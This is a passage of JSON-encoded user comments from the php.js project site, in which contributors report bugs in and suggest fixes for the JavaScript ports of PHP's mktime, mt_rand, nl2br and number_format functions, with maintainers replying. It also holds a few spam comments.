9 as it 'should'\r\n[\/CODE]\r\n\r\nThank you for all the info."},{"date":"2008-07-01 00:13:57","author":"jakes","url":"","comment":"when iterating through a loop with negative values for month, on the transition to positive (zero month) php delivers expected values but js doesnt, ie:\r\n\r\n[CODE=&quot;Javascript&quot;]alert(mktime(0,0,0,0,1,2008) + &quot; - &quot; + date('d M Y', mktime(0,0,0,0,1,2008)));[\/code]\r\n\r\n[CODE=&quot;php&quot;]echo mktime(0, 0, 0, 0, 1, 2008).&quot; - &quot;.date(&quot;d M Y&quot;, mktime(0, 0, 0, 0, 1, 2008));[\/code]\r\n\r\njs:  1201788000 - 01 Feb 2008\r\nphp: 1196427600 - 01 Dec 2007"},{"date":"2008-07-18 07:45:29","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ jakes: Thanks for your input. I've updated the function"},{"date":"2009-01-16 10:25:29","author":"Marc Palau","url":"http:\/\/www.nbsp.es","comment":"Kevin, the returned value by mktime on php without arguments (or with less arguments) is based on the current date, not [0,0,0,1,1,1972].\r\n\r\nTo solve, just delete this line:\r\n\r\n[CODE=&quot;javascript&quot;]d.setHours(0,0,0); d.setDate(1); d.setMonth(1); d.setYear(1972);[\/CODE]\r\n\r\nThanks!!\r\nMarc"},{"date":"2009-01-16 23:27:31","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Marc Palau: We still need that line for the other examples to work, but I think we got it right now. Agree? Thanks for helping us out Marc!"},{"date":"2009-01-17 16:04:19","author":"Marc Palau","url":"http:\/\/www.nbsp.es","comment":"Two comments on one:\r\n\r\nI'm not agree with tath mod. man, you are not filtering the arguments.\r\nDefinetively this is all wrong (sorry man)\r\n\r\nI have rewrited the function, please take a test and tell me if I'm OK:\r\n\r\n[CODE=&quot;Javascript&quot;]function mktime() {\r\n\t\/\/agree here\r\n    var d = new Date(), argv = arguments; \r\n\tvar cH=argv[0]!=undefined?argv[0]*1:d.getHours(),\/\/hours\r\n\t\tci=argv[1]!=undefined?argv[1]*1:d.getMinutes(),\/\/minutes\r\n\t\tcs=argv[2]!=undefined?argv[2]*1:d.getSeconds(),\/\/second\r\n\t\tcn=argv[3]!=undefined?(argv[3]*1)-1:d.getMonth(),\/\/month\r\n\t\tcj=argv[4]!=undefined?argv[4]*1:d.getDate(),\/\/day\r\n\t\tcY=argv[5]!=undefined?argv[5]*1:d.getYear()+1900;\/\/year\r\n\t\r\n\td.setHours(cH,ci,cs); d.setDate(cj); d.setMonth(cn); d.setYear(cY);\r\n\t\r\n    return Math.floor(d.getTime()\/1000);\r\n}[\/CODE]\r\n\r\nTo test I have used this code:\r\n\r\n[CODE=&quot;Javascript&quot;]function test(){\r\n\tdocument.body.appendChild(div=document.createElement(&quot;div&quot;));\r\n\tvar w=function(v){\r\n\t\tdiv.innerHTML+=v+&quot;&lt;br&gt;&quot;;\r\n\t}\r\n\r\n\tw(&quot;xx:xx:xx xx\/xx\/xxxx: &quot;+mktime());\r\n\tw(&quot;10:xx:xx xx\/xx\/xxxx: &quot;+mktime(10));\r\n\tw(&quot;10:10:xx xx\/xx\/xxxx: &quot;+mktime(10,10,10));\r\n\tw(&quot;10:10:10 10\/xx\/xxxx: &quot;+mktime(10,10,10,10));\r\n\tw(&quot;10:10:00 10\/10\/xxxx: &quot;+mktime(10,10,10,10,10));\r\n\tw(&quot;10:10:10 10\/10\/2000: &quot;+mktime(10,10,10,10,10,2000));\r\n\tw(&quot;00:00:00 05\/03\/2008: &quot;+mktime(0, 0, 0, '05', '03', '2008')+&quot; [&lt;?=mktime(0, 0, 0, '05', '03', '2008')?&gt;]&quot;);\r\n\tw(&quot;00:00:00 05\/04\/2008: &quot;+mktime(0, 0, 0, '05', '04', '2008')+&quot; [&lt;?=mktime(0, 0, 0, '05', '04', '2008')?&gt;]&quot;);\r\n\tw(&quot;00:00:00 05\/05\/2008: &quot;+mktime(0, 0, 0, '05', '05', '2008')+&quot; [&lt;?=mktime(0, 0, 0, '05', '05', '2008')?&gt;]&quot;);\r\n\tw(&quot;00:00:00 05\/06\/2008: &quot;+mktime(0, 0, 0, '05', '06', '2008')+&quot; [&lt;?=mktime(0, 0, 0, '05', '06', '2008')?&gt;]&quot;);\r\n\tw(&quot;00:00:00 05\/07\/2008: &quot;+mktime(0, 0, 0, '05', '07', '2008')+&quot; [&lt;?=mktime(0, 0, 0, '05', '07', '2008')?&gt;]&quot;);\r\n\tw(&quot;00:00:00 05\/08\/2008: &quot;+mktime(0, 0, 0, '05', '08', '2008')+&quot; [&lt;?=mktime(0, 0, 0, '05', '08', '2008')?&gt;]&quot;);\r\n\tw(&quot;00:00:00 05\/09\/2008: &quot;+mktime(0, 0, 0, '05', '09', '2008')+&quot; [&lt;?=mktime(0, 0, 0, '05', '09', '2008')?&gt;]&quot;);\r\n\tw(&quot;00:00:00 05\/10\/2008: &quot;+mktime(0, 0, 0, '05', '10', '2008')+&quot; [&lt;?=mktime(0, 0, 0, '05', '10', '2008')?&gt;]&quot;);\r\n\tw(&quot;00:00:00 05\/11\/2008: &quot;+mktime(0, 0, 0, '05', '11', '2008')+&quot; [&lt;?=mktime(0, 0, 0, '05', '11', '2008')?&gt;]&quot;);\r\n}[\/CODE]\r\n\r\n\r\nAnd a free tip:\r\n\tparseInt('09') it's an octet, 9 don't exist, return false or 0; parseInt('08') will fail too\r\n\tparseInt('05') return 5\r\n\tparseInt('010') return 8\r\n\tparseInt('011') return 9\r\n\tvar n='09'*1; work fine ;) \/\/parseInt it's not necesary\r\n\r\n\r\nPlease, make the textarea bigger ;)\r\n\r\nif you need something more, please send me an e-mail :) (I visit usually your project, but not every day)\r\ngood luck!\r\nMarc\r\nhttp:\/\/www.nbsp.es"},{"date":"2009-01-25 13:05:46","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Marc Palau: Maybe it's because we're in different timezones, but your function fails the second &amp; 3rd test. So, sorry but I cannot replace the current implementation just yet.\r\n\r\nAnd:\r\n[CODE=&quot;Javascript&quot;]\r\nno = parseInt(argv[i]*1);\r\n[\/CODE]\r\n\r\nalready multiplies by one, btw."},{"date":"2009-02-06 12:24:56","author":"Marc Palau","url":"http:\/\/www.nbsp.es","comment":"Ok Kevin, I will take a look with diferent timezones and I will fix it :)\r\n\r\nthanks for your reply"},{"date":"2009-02-11 02:19:45","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Marc Palau: very well!"},{"date":"2009-07-26 02:27:47","author":"tomi","url":"","comment":"Hello mans!\n\nI executed mktime(0,0,0,7,1,1975) sintax under both of javascript and php, and I have got not equal results.\nThe js produced this: 173397600\nThe php produced this: 173401200\n\nThis is a bug!\nHave a nice day!\n"},{"date":"2009-07-26 20:04:56","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Are you in a different time zone than your server? JavaScript can only use the user's default timezone unless we were to program the function to work with date_default_timezone_set(), as we should, but in that case you'd still need to call that extra function... Any patches are welcome..."},{"date":"2009-08-30 14:00:12","author":"3D-GRAF","url":"","comment":"Found bug:\r\nmktime(0, 0, 0, 2, 23, 2009);\r\n\r\nResults:\r\nJS: 1237755600\r\nPHP: 1235336400\r\n\r\nNeed a solution, help.\r\n"},{"date":"2009-08-30 16:59:52","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@3D-GRAF : Thanks for the report. Since the date today (whether the 29th or 30th) is an impossible day for February, our function was mistakenly moving the month up to March. Fixed in SVN.\n\nPlease note though that while we have date_default_timezone_set() implemented (it uses this.php_js.default_timezone to store the current timezone), mktime (and no doubt a number of others) do not use the information yet.\n\nSo, it will currently just work against the current locale in the user's JavaScript--and you can't directly control the timezone via JavaScript. So, we have to fix mktime at some point to check our own this.php_js.default_timezone and adjust the time and possibly date accordingly in case someone wishes to control the timezone via JS (as opposed to letting the user's locale determine that)."},{"date":"2009-09-14 09:35:07","author":"swyong","url":"-","comment":"i cannot return the UNIX value which i put the argument. but it's working without the argument.(return today UNIX)\r\n\r\nmktime(0,0,0,10,2,2009); this is argument i put.\r\n\r\nand i notice that this function dun have any arguments needed. function mktime () {....}\r\n\r\nim newbie, please help."},{"date":"2009-09-14 16:01:28","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@swyong: Are you using the latest version of the function? If yes, what errors are you getting? (e.g., if using Firefox, what does it say in Tools->Error Console when you run the function?) I'm not getting any errors with the code you gave... \n\nThe reason no arguments appear is because the automatically-built \"arguments\" object (available in JavaScript, like func_get_args() in PHP if you know what that is) is used here to get that information."},{"date":"2010-01-05 22:08:23","author":"zeroneta","url":"","comment":"[CODE]\n_.mktime = function()\n{\n\tvar a = date();\n\targuments.length > 1 && a.setHours.apply( a, arguments );\n\targuments.length > 3 && a.setFullYear( arguments[5] == un ? a.getFullYear() : arguments[5], arguments[3] == un ? a.getMonth() : arguments[3] - 1, arguments[4] == un ? a.getDate() : arguments[4] );\n\treturn _.floor( a.getTime() \/ 1000 );\n},\n[\/CODE]\n\n\u6211\u5199\u7684JS\u7c7b \u4e0b\u8f7d\u5730\u5740 \u6709\u7231\u597d\u7684\u53ef\u4ee5\u63a2\u8ba8\n\nhttp:\/\/bgscript.com\/jscore\/script\/core.js"},{"date":"2010-01-18 01:56:45","author":"Chris","url":"","comment":"PHP:    mktime(23,59,59,13,0,2010) => 1293857999 \nPHPJS: mktime(23,59,59,13,0,2010) => 1325393999\n\nLooks like it doesn't like the '13' month with the '0' day which should be the last day of the previous month."},{"date":"2010-01-19 06:13:54","author":null,"url":"","comment":"@Chris: Thank you for finding this bug. The function has been updated to fix this bug as well as others. (http:\/\/github.com\/kvz\/phpjs\/raw\/master\/functions\/datetime\/mktime.js) "},{"date":"2010-02-23 12:10:43","author":"Micky","url":"","comment":"this date dosn't work...\n01\/01\/2020 12h00:00\nmktime(js) return 1152784800\ninstead of 1577876400 (mktime php)\n\nwhy i don't know but it's strange..."},{"date":"2010-12-11 10:05:22","author":"Nikolay Ivanov","url":"http:\/\/www.mediasoft.bg\/","comment":"1. I'm not guru, but isn't going to be much easier if you use:\n[CODE]\nnew Date(year, month, day, hours, minutes, seconds, milliseconds)\n[\/CODE]\nTo create the date object? Just the order of parameters is different than mktime in PHP.\n\n2. Suggestion - why not using a small piece of AJAX code and simple .PHP file on the server just to use the real mktime function? This way you'll get always the server time, not the local one!"},{"date":"2010-12-11 13:39:58","author":"Rafa? Kukawski","url":"","comment":"@Nikolay Ivanov:\nthe goal of this project is to port php functions to javascript, so people familiar with PHP will be able to write something in javascript without good knowledge of this scripting language. The server time is something that we don't need.\nUsing only new Date(...) won't allow us to do an exact port of PHP API.\nUsing your suggestion, wouldn't allow us to do an exact port of PHP API. Your suggestion assumes that every single parameter is present, but PHP defines every param as optional, so we have to use current time. Thus, it's easier to create new Date instance with current time and update it."},{"date":"2011-05-12 19:35:22","author":"Luiz Miguel Axcar","url":"http:\/\/paineldegeneralidades.blogspot.com","comment":"Fellows,\n\nDon't forget converting string numbers to integer before sending to the functions, like this:\n\n[CODE]\ntime = mktime(0,0,0,Number(month),Number(day),Number(year))\n[\/CODE]\n\nor the function returns unexpected results.\n\nCheers,\n\nLuiz Miguel Axcar\nBauru, S\u00e3o Paulo, Brazil"},{"date":"2012-04-18 10:20:43","author":"????? ????","url":"http:\/\/an3m1.com\/","comment":"If I might \u2014perhaps you should consider adding a few images. I don\u2019t mean to disrespect what you\u2019ve said ; its very enlightening, indeed. However, I think would respond to it more positively if they could be something tangible to your ideas \n"}],"mt_rand":[{"date":"2012-06-29 21:31:56","author":"Kongo","url":"","comment":"Hi ! Your function doesn't work :) \nWhy ? You don't use parseInt :)\nworking is :\n[CODE]\nfunction mt_rand (min, max) {\n    var argc = arguments.length;\n    if (argc === 0) {        min = 0;\n        max = 2147483647;\n    } else if (argc === 1) {\n        throw new Error('Warning: mt_rand() expects exactly 2 parameters, 1 given');\n    }    \nvar score = Math.floor(Math.random() * (max - min + 1));\nscore = parseInt(score) + parseInt(min);\nreturn score;\n}\n[\/CODE]\n\n:)"},{"date":"2012-07-04 15:24:04","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Kongo: I can see how parseInt is necessary for the min part, but Math.floor should already be creating an integer for the score portion. Still, I do see that PHP seems to cut off the decimal portion for min and max, so I think we should parseInt on both arguments BEFORE calculation to avoid any chance of too high of a max. I have made this change in Git."}],"natcasesort":[{"date":"2012-05-06 09:33:30","author":"???? ????","url":"http:\/\/an3m1.com\/","comment":"Write more, that\u2019s all I have to say. Literally, it seems as though you relied on the video to make your point. You clearly know what you\u2019re talking about, why waste your intelligence on just posting videos to your blog when you could be giving us something enlightening to read \n"}],"nl2br":[{"date":"2008-04-15 02:41:13","author":"Philip Peterson","url":"","comment":"There are a few inconsistencies here:\r\n\r\nfirst off, the replacement text should be &quot;&lt;br \/&gt;\\n&quot; (with the space before the backslash in &lt;br \/&gt; and including the newline).  Also, I don't have time to do this, but you may want to check out how PHP handles \\r\\n and \\r in this function, as it may be useful to implement support for if the PHP function does it."},{"date":"2008-04-15 08:18:18","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Philip Peterson: I've updated the function with your suggestions. Thank you!"},{"date":"2008-05-21 11:13:42","author":"Joshua","url":"","comment":"Nice piece of js code, very usefull :) I'm not using the whole package but just little pieces of code, great work!"},{"date":"2008-05-21 12:57:12","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Joshua: Thank you, we're still working on a tool to customize &amp; save your own php.js version, maybe that would be something for you then!"},{"date":"2008-09-06 21:28:33","author":"Music Russia","url":"http:\/\/darussia.com","comment":"Do not work in my case."},{"date":"2008-09-08 00:22:17","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Music Russia: Please be more specific, can you for example provide the code how you call it? And explain what breaks? Thanks a lot!"},{"date":"2008-09-08 03:10:20","author":"Music Russia","url":"http:\/\/darussia.com","comment":"Sorry, Kevin, that's just my stupid mistake, i confused one var with another. I spend about 15 minutes until figured it out.\r\n\r\nHere's the part of my code and it 100% works now:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nvar nfull = document.getElementById('full').value;\r\nnfull = nfull.replace(\/([^&gt;])\\\\n\/g, '$1&lt;br \/&gt;');\r\ndocument.getElementById('txtpr').innerHTML = nfull;\r\n[\/CODE]\r\n\r\nThank you for the hint!"},{"date":"2008-09-26 13:33:57","author":"Onno Marsman","url":"","comment":"To make sure it's a string i.e. nl2br(6):\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction nl2br( str ) {\r\n     return (str+'').replace(\/([^&gt;])\\n\/g, '$1&lt;br \/&gt;\\n');\r\n}\r\n[\/CODE]"},{"date":"2008-09-26 13:37:35","author":"Onno marsman","url":"","comment":"I guess html is not escaped correctly, I meant:\r\n[CODE=&quot;Javascript&quot;]\r\nfunction nl2br( str ) {\r\n    return (str+'').replace(\/([^&gt;])\\n\/g, '$1&amp;lt;br \/&amp;gt;\\n');\r\n}\r\n[\/CODE]"},{"date":"2008-09-26 13:39:59","author":"Onno Marsman","url":"","comment":"lol, still no good. Kevin: you know what I mean. I've only added (str+'')"},{"date":"2008-09-29 12:37:00","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsman: Nice :) Function has been updated according to your proposal!"},{"date":"2008-10-10 18:39:20","author":"Atli \u00de\u00f3r","url":"http:\/\/atli.advefir.com","comment":"Hi.\r\n\r\nThere seems to be a minor flaw in the function for strings that start with a line-breaks, or have multiple consecutive line-breaks.\r\n\r\nUsing this:\r\n[code=\"text\"]nl2br(&quot;\\nOne\\nTwo\\n\\nThree\\n&quot;)[\/code]\r\nit leaves out the first new-line and replaces the two new-lines between &quot;Two&quot; and &quot;Three&quot; with a single break.\r\n\r\nMaking the regex non-greedy seems to fix this tho:\r\n[CODE]\r\nreturn (str + '').replace(\/([^&gt;]?)\\n\/g, '$1&lt;br \/&gt;\\n');\r\n[\/code]\r\n\r\nAdditionally,  PHP 5.3 will accept a second parameter, indicating whether the break should be XHTML compliant or not.\r\n\r\nThis would allow for that as well:\r\n[CODE]\r\nfunction nl2br( str, is_xhtml ) {\r\n    breakTag = &quot;&lt;br \/&gt;&quot;;\r\n    if(typeof is_xhtml == &quot;boolean&quot; || is_xhtml == false) {\r\n        breakTag = &quot;&lt;br&gt;&quot;;\r\n    }\r\n    return (str + '').replace(\/([^&gt;]?)\\n\/g, '$1'+ breakTag +'\\n');\r\n}\r\n[\/code]"},{"date":"2008-10-10 18:44:23","author":"Atli \u00de\u00f3r","url":"atli.advefir.com","comment":"Not sure why my last post got messed up like that.\r\nIf it was bad formatting on my part I apologize."},{"date":"2008-10-13 11:25:57","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Atli \u00c3\u017e\u00c3\u00b3r: That's a Great contribution Atli \u00c3\u017e\u00c3\u00b3r. I wish I could give your more credit, than the current system can give you. Thanks man."},{"date":"2009-01-14 07:56:20","author":"John Peterson","url":"http:\/\/www.phpontrax.com","comment":"Why not just do this so much simplier...\r\n\r\nString.prototype.nl2br = function() {  \r\n    var breakTag = '&lt;br \/&gt;';    \r\n    return (this + '').replace(\/([^&gt;]?)\\n\/g, '$1'+ breakTag +'\\n');  \r\n}\r\n\r\nthen you can just do:\r\n\r\nmystring.nl2br()"},{"date":"2009-01-14 09:53:21","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"HI John,\r\n\r\nI think concerns on this range from &quot;What happens if a standard version gets implemented later?&quot; to &quot;Will this interfere with other implementations added to the prototype (as a kind of &quot;global&quot; problem?&quot;), etc.. However, I personally think this could be very convenient for those willing to take the risk (or who reset the prototype after their code is done with it). \r\n\r\nMaybe when we get the string functions done ( ;) ), we can make one version of the PHP-JS package which adds to the prototype (also for Array, Object, Number, or maybe Function or Boolean if you can think of a reason!), as I'm hoping we can see a configurable version made at some point (as an independent project, if not through Kevin's official version)."},{"date":"2009-01-14 10:00:20","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"I should add the extra qualification that overloading the Object or Array prototype would probably be quite objectionable to many and need some serious revising of the PHP-JS functions (which I'm thinking should probably be revised regardless) to check for hasOwnProperty in each iterating for loop."},{"date":"2009-01-14 12:03:30","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ John Peterson: Of course: that's not at all like PHP. And that's what we're trying to recreate here: So the main version should be as is it right now.\r\n\r\nHowever. Just like there's a namespaced version of PHP.JS, I think it should be possible for us to generate prototype versions with the compiler. \r\n\r\nCurrently this is a low priority for me and I would first like to create a public interface to the compiler on the phpjs.org site.\r\n\r\nBut I will keep this in mind as a future feature!"},{"date":"2009-11-13 15:49:44","author":"Maximusya","url":"","comment":"Taking into account different newline combinations (\\r\\n, \\r, \\n), function should return\r\n[code]\r\nreturn (str + '').replace(\/([^>\\r\\n]?)(\\r\\n|\\n\\r|\\r|\\n)\/g, '$1'+ breakTag +'$2');\r\n[\/code]"},{"date":"2009-11-14 00:14:01","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Maximusya: Good catch--fixed in http:\/\/github.com\/kvz\/phpjs\/commit\/cc8835a98b175ad7038fcd64c85936f3bea8bdbb"},{"date":"2010-02-17 16:32:32","author":"Atttze","url":"","comment":"According to the PHP docs it should be:\n\n[CODE]\nvar breakTag = (is_xhtml || typeof is_xhtml === 'undefined') ? '<br \/>' : '<br>';\n[\/CODE]\n\nNot:\n[CODE]\nvar breakTag = (is_xhtml || typeof is_xhtml === 'undefined') ? '' : '<br>';\n[\/CODE]"},{"date":"2010-02-17 16:34:35","author":"Atttze","url":"","comment":"In Firefox (maybe more browsers) the <br \/> in the code block above at line 22 is 'hidden'..."},{"date":"2011-07-28 04:29:02","author":"Dj","url":"","comment":"Why not use first regex instead the second one? (without [^>\\r\\n]?)\n[CODE]\nreturn (str + '').replace(\/(\\r\\n|\\n\\r|\\r|\\n)\/g, breakTag + '$1');\n[\/CODE]\n[CODE]\nreturn (str + '').replace(\/([^>\\r\\n]?)(\\r\\n|\\n\\r|\\r|\\n)\/g, '$1' + breakTag + '$2');\n[\/CODE]"},{"date":"2011-09-04 11:00:13","author":"PJ Brunet","url":"http:\/\/tomakefast.com","comment":"I'm voting for [CODE]<br \/>[\/CODE] vs. \"br\" "},{"date":"2011-09-05 08:59:37","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@PJ Brunet: Just avoid the 2nd argument (or pass true) (it's not showing in the syntax highlighter, but it's there if you look at the source). That's the PHP way too, which we try to stick to here..."},{"date":"2011-09-06 08:19:31","author":"PJ Brunet","url":"http:\/\/tomakefast.com","comment":"Thanks for the clarification, indeed I was looking at the syntax highlighter version.  \n\nI'm about to try this function to workaround some .innerHTML issue I'm having.  "},{"date":"2012-01-04 19:15:13","author":"Thomas","url":"","comment":"The breakTag variable doesn't display correctly."},{"date":"2012-05-11 08:05:05","author":"Alvin","url":"","comment":"[CODE]\nvar breakTag = (is_xhtml || typeof is_xhtml === 'undefined') ? '' : '<br>';\n[\/CODE]\n\nthat line is wrong, it should be:\n\n[CODE]\nvar breakTag = (is_xhtml || typeof is_xhtml === 'undefined') ? '<br \/>' : '<br>';\n[\/CODE]"},{"date":"2012-06-16 07:09:49","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Alvin, Thomas: It is ok in Git, but not in the display. Click \"raw js source\" to see. However, I also changed the source to split up the line break so that it will hopefully display correctly once the cache of the site is reset."},{"date":"2012-09-24 09:31:54","author":"ee","url":"","comment":"\u0e01\u0e14\u0e2b\u0e01\u0e14\u0e2b\u0e01\u0e14\n\u0e33\u0e33\u0e33\u0e33\n\u0e41\u0e41\u0e41\u0e41\u0e41\u0e41"},{"date":"2012-10-04 13:00:24","author":"Rene Springmann","url":"http:\/\/rene-springmann.de","comment":"Thank u for that great function"}],"number_format":[{"date":"2008-03-01 07:33:49","author":"Michael White","url":"","comment":"There is a bug in Safari - at least in Safari 3.0.4 that causes the combination of Math.abs(0).toFixed(x) where x seems to be any positive integer to provide erroneous output.\r\n\r\nThe sample code below contains problematic code at the top and a sample solution line at the end. The new code for the number_format() function actually is in a separate code block below this one.\r\n[CODE=&quot;Javascript&quot;]\r\nvar price = 0.00;\r\nalert(Math.abs(price)); \/\/ Alerts: 0 - correct.\r\n\t\r\n\/\/ Alerts: 0.00 in most browsers.\r\n\/\/ In Safari 3.0.4 you get: 0.-0\r\nalert(Math.abs(price).toFixed(2));\r\n\t\r\n\/\/ However - If you skip the use of Math.abs() on a 0 value then the toFixed() function works correctly.\r\nvar new_price = 0;\r\nalert(new_price.toFixed(2));\r\n\t\r\n\/\/ Temp-fix ( I submitted this bug to Apple)\r\nvar num = 0;\r\nvar result = Math.abs(0).toFixed(1);\r\nalert(result);\r\nresult = result.replace(\/-\/, 0);\r\nalert(result);\r\n[\/CODE]\r\n\r\nSince this problem only occurs when working on a value of 0 (zero) to begin with we know that the hyphen character should be a 0 so we can simply replace it with a 0 if it is found.\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n\/\/ The easiest way to fix this is to simply modify the line that reads:\r\nkd = (decimals ? dec_point + Math.abs(number - i).toFixed(decimals).slice(2) : &quot;&quot;);\r\n\r\n\/\/ with the following line of code:\r\nkd = (decimals ? dec_point + Math.abs(number - i).toFixed(decimals).replace(\/-\/, 0).slice(2) : &quot;&quot;);\r\n\r\n\/\/ The only difference is the addition of .replace(\/-\/, 0) just before the slice() method is used.\r\n\/\/ This tiny extra amount of processing should not be significant unless number_format() is run in very tight loops - and even then it can only be considered extra in browsers like IE, Opera, and Firefox since this appears to be a Safari only bug. Checking the browser seemed to be overkill in this instance.\r\n[\/CODE]\r\n\r\nI hope it helps!\r\n\r\nMichael White - 2008\r\nmichael -a-t- crestidg.com\r\nhttp:\/\/crestidg.com\/"},{"date":"2008-03-01 15:39:39","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Michael White: It sure did, thanks for taking the time to supply better code. I've updated the function!"},{"date":"2008-03-01 17:26:33","author":"Michael White","url":"","comment":"No problem. I love having these familiar PHP functions available. I have a sort of proposal for you, maybe you could contact me via email (michael -a-t- crestidg.com) so I can get you some more details. It probably wouldn't take too much time for us to do and it would benefit those who want to use the entire PHP.js package along side other JavaScript quite a lot."},{"date":"2008-03-20 05:21:49","author":"Benjamin &quot;balupton&quot; Lupton","url":"","comment":"dec_point and thousands_sep defaults should be the other way round"},{"date":"2008-03-20 15:05:56","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Benjamin Lupton: Thank you!"},{"date":"2008-03-28 15:57:35","author":"Allan Jensen","url":"","comment":"The function has a problem with negative numbers.\r\n\r\nThis:\r\n\r\nnumber_format(-258.75, 2, &quot;,&quot;, &quot;.&quot;)\r\n\r\nincorrectly gives:\r\n\r\n-,258,75\r\n\r\nPlease help me fix this."},{"date":"2008-03-28 23:19:53","author":"Allan Jensen","url":"","comment":"Fixed the problem with negative numbers myself. Function needs to look like this:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction number_format( number, decimals, dec_point, thousands_sep ) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Jonas Raoni Soares Silva (http:\/\/www.jsfromhell.com)\r\n    \/\/ +   improved by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n    \/\/ +     bugfix by: Michael White (http:\/\/crestidg.com)\r\n    \/\/ +     bugfix by: Benjamin Lupton\r\n\t\/\/ +     bugfix by: Allan Jensen (http:\/\/www.winternet.no) (fixed formatting negative numbers)\r\n    \/\/ *     example 1: number_format(1234.5678, 2, '.', '');\r\n    \/\/ *     returns 1: 1234.57\r\n \r\n    var i, j, kw, kd, km;\r\n\tvar neg = &quot;&quot;;\r\n\r\n\t\/\/ Input sanitation &amp; defaults\r\n\tif ( isNaN(decimals = Math.abs(decimals)) ) {\r\n\t\tdecimals = 2;\r\n\t}\r\n\tif (dec_point == undefined) {\r\n\t\tdec_point = &quot;.&quot;;\r\n\t}\r\n\tif (thousands_sep == undefined) {\r\n\t\tthousands_sep = &quot;,&quot;;\r\n\t}\r\n\r\n\ti = parseInt(number = (+number || 0).toFixed(decimals)) + &quot;&quot;;\r\n\tif (i.substr(0,1) == &quot;-&quot;) {\r\n\t\tnumber = Math.abs(number);\r\n\t\tneg = &quot;-&quot;;\r\n\t\ti = i.substr(1);\r\n\t}\r\n\r\n\tif ((j = i.length) &gt; 3 ) {\r\n\t\tj = j % 3;\r\n\t} else {\r\n\t\tj = 0;\r\n\t}\r\n\r\n\tkm = (j ? i.substr(0, j) + thousands_sep : &quot;&quot;);\r\n\tkw = i.substr(j).replace(\/(\\d{3})(?=\\d)\/g, &quot;$1&quot; + thousands_sep);\r\n\t\/\/kd = (decimals ? dec_point + Math.abs(number - i).toFixed(decimals).slice(2) : &quot;&quot;);\r\n\tkd = (decimals ? dec_point + Math.abs(number - i).toFixed(decimals).replace(\/-\/, 0).slice(2) : &quot;&quot;);\r\n\treturn neg + km + kw + kd;\r\n}\r\n[\/CODE]"},{"date":"2008-03-29 10:39:31","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Allan Jensen: Wow thanks for fixing it!"},{"date":"2008-04-09 18:11:44","author":"Howard Yeend","url":"","comment":"yay for Allan Jensen. I just noticed the same bug he fixed. cheers dude."},{"date":"2008-04-12 20:10:46","author":"Jonas Raoni","url":"","comment":"I corrected all of the bugs that I found:\r\n- Negative numbers;\r\n- Starting with zero;\r\n- Rouding (when cutting the decimal places of &quot;0.9&quot; it should be 1 not 0).\r\n\r\nAnd here is the last version of the code:\r\n\r\nNumber.prototype.formatMoney = function(c, d, t){\r\n\tvar n = this, c = isNaN(c = Math.abs(c)) ? 2 : c, d = d == undefined ? &quot;,&quot; : d, t = t == undefined ? &quot;.&quot; : t, s = n &lt; 0 ? &quot;-&quot; : &quot;&quot;,\r\n\ti = parseInt(n = Math.abs(+n || 0).toFixed(c)) + &quot;&quot;, j = (j = i.length) &gt; 3 ? j % 3 : 0;\r\n\treturn s + (j ? i.substr(0, j) + t : &quot;&quot;) + i.substr(j).replace(\/(\\d{3})(?=\\d)\/g, &quot;$1&quot; + t)\r\n\t+ (c ? d + Math.abs(n - i).toFixed(c).slice(2) : &quot;&quot;);\r\n};"},{"date":"2008-04-13 12:44:13","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Jonas Raoni: Thanks I've updated the function. I have one remark though. We generally compress code with packer &amp; jsmin to obtain bandwidth &amp; speed advantages, while maintaining readability so developers can more easily understand and update each others code."},{"date":"2008-06-06 11:26:54","author":"Howard Yeend","url":"","comment":"just a comment; aren't the default values for dec_point and thou_sep the wrong way around?\r\n\r\nby default it formats 12345.67 as 12.345,67\r\n\r\nshouldn't it be 12,345.67 ?"},{"date":"2008-06-08 16:07:35","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Howard Yeend: Thanks for noticing. This function was revised, and that reimported a previously fixed bug. It's probably because in some countries (including my own), the dec_point and thou_sep are indeed the other way around compared to the english standard. Anyway. fixed again :)"},{"date":"2008-08-28 16:54:37","author":"Chad Smith","url":"http:\/\/www.getasupplier.com","comment":"Anyone else notice that if you just put in 1000 it doesn't format the number to 1,000?  But if you put in 1001 it formats correctly to 1,001.\r\n\r\nAny idea what could make that happen?"},{"date":"2008-08-28 17:00:54","author":"Chad Smith","url":"http:\/\/www.getasupplier.com","comment":"Ignore my previous comment, I'm an idiot.  I was checking to see if it was larger than 